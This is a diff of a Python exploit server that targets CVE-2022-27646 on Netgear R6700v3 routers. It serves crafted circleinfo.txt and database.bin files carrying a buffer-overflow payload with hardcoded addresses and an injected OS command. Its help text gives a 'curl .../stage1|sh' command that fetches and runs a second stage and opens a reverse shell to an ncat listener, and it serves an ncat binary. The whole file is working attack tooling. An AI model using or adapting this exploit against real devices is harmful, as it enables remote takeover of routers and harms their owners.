@@ -1,17 +1,15 @@
 #!/usr/bin/env python3
 ## -*- coding: utf-8 -*-
-import os
-import re
-import subprocess
-from argparse     import ArgumentDefaultsHelpFormatter, ArgumentParser
+from argparse     import RawTextHelpFormatter, ArgumentParser
 from http.server  import BaseHTTPRequestHandler, HTTPServer
+from os           import path
 from urllib.parse import urlparse
-from typing       import Dict, Tuple
+from typing       import Dict
 
 class HttpHandler(BaseHTTPRequestHandler):
 
     protocol_version = "HTTP/1.1"
-    cmd = ""
+    cmd = None
     cmd_ptr = 0xbeffc104 + 392 + 4
     
     def version_string(self) -> str:
@@ -25,11 +23,32 @@ class HttpHandler(BaseHTTPRequestHandler):
         self.wfile.write(content)
         return
     
-    def serve_stage0_payload(self) -> bytes:
-        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
-        cmd = "touch${IFS}/tmp/st0;" + HttpHandler.cmd.replace(" ", "${IFS}")
+    def serve_file(self, filename: str) -> bytes:
+        f = open(path.join(path.dirname(__file__), filename), "rb")
+        b = f.read()
+        f.close()
+        return b
+    
+    def serve_stage0_payload(self, database: bool = False) -> bytes:
+
+        cmd = HttpHandler.cmd
         cmd_ptr = HttpHandler.cmd_ptr
 
+        # Serve requests for database.bin
+        if database:
+            if cmd:
+                return b"foobar"
+            else:
+                return self.serve_file("resources/database.bin")
+            
+        # Serve requests for circleinfo.txt
+        if not cmd:
+            return self.serve_file("resources/circleinfo.txt")
+
+        # Replace spaces in the command (spaces cannot be used due to sscanf(str, "%s %s"))
+        cmd = "touch${IFS}/tmp/st0;" + cmd.replace(" ", "${IFS}")
+
+        # Generate payload
         max_cmd_len = 625-3
         payload  = b"A"*368
         payload += cmd_ptr.to_bytes(4, "little")        # g0_r6_val (addr. of OS command)
@@ -57,24 +76,18 @@ class HttpHandler(BaseHTTPRequestHandler):
         """
         return payload
     
-    def serve_stage1_ncat(self) -> bytes:
-        f = open("./binaries/ncat", "rb")
-        ncat = f.read()
-        f.close()
-        return ncat
-    
     def do_GET(self) -> None:
         url_components = urlparse(self.path)
         # Stage 0 payload(s)
         if url_components.path == "/circleinfo.txt":
-            self.write_response(200, "application/octet-stream", self.serve_stage0_payload())
+            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(False))
         elif url_components.path == "/database.bin":
-            self.write_response(200, "application/octet-stream", b"foobar")
+            self.write_response(200, "application/octet-stream", self.serve_stage0_payload(True))
         # Stage 1 payload(s)
         elif url_components.path == "/stage1":
             self.write_response(200, "application/octet-stream", self.serve_stage1_payload())
         elif url_components.path == "/stage1/ncat":
-            self.write_response(200, "application/octet-stream", self.serve_stage1_ncat())
+            self.write_response(200, "application/octet-stream", self.serve_file("bins/ncat"))
         # Not found
         else:
             self.write_response(404, "text/plain", b"Not found.")
@@ -104,19 +117,26 @@ class HttpServer:
 if __name__ == "__main__":
     # Argument parsing
     description = """
-    HTTP server, delivering malicious `circleinfo.txt` and `database.bin` files, exploiting
-    CVE-2022-27646 on Netgear R6700v3 routers.
+    HTTP server delivering files `circleinfo.txt` and `database.bin` to exploit CVE-2022-27646 on
+    Netgear R6700v3 routers.
 
-    The default `cmd` will start a reverse shell on the victim. For this to work, ensure to run a
-    listener beforehand (`ncat -l -p 5001`).
+    In case argument `--cmd` is not specified, legitimate copies of files `circleinfo.txt` and
+    `database.bin` are served.
+
+    In case argument `--cmd` is specified, it corresponds to an OS command that will be included in
+    the stage 0 payload.
+
+    Use `--cmd "curl http://HOST:PORT/stage1|sh"` to trigger the invocation of a reverse shell. Note
+    that in order to receive the reverse shell, a listener on port 5001 has to be started beforehand
+    (`ncat -l -p 5001`).
     """
-    parser = ArgumentParser(description=description, formatter_class=ArgumentDefaultsHelpFormatter)
+    parser = ArgumentParser(description=description, formatter_class=RawTextHelpFormatter)
     parser.add_argument("--host", type=str, default="0.0.0.0",
                         help="host of the HTTP server")
     parser.add_argument("--port", type=int, default=5000,
                         help="port of the HTTP server")
-    parser.add_argument("--cmd", type=str, default="curl http://127.0.0.1:5000/stage1|sh",
-                        help="OS command to execute as stage 0 payload")
+    parser.add_argument("--cmd", type=str, default=None,
+                        help="OS command to execute or None to send original files")
     args =  parser.parse_args()
 
     # HTTP Server
